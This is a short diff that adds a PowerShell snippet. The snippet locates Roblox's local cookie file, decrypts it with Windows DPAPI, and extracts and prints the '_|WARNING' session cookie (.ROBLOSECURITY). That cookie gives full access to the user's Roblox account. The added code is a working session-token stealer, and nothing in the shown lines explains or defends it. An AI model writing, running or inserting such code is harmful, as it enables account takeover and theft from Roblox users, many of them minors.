@@ -1,0 +1,2 @@
+$OutputEncoding = [System.Text.Encoding]::UTF8
+$p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; if(Test-Path $p){ [void][Reflection.Assembly]::LoadWithPartialName('System.Security'); $j=(Get-Content $p -Raw|ConvertFrom-Json).CookiesData; $d=[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j),$null,'CurrentUser'); $s=[Text.Encoding]::UTF8.GetString($d); if($s -match '(_\|WARNING.*?)(;|$)'){$cookie=$matches[1]; $cookie} }else{"Roblox Not Found"}
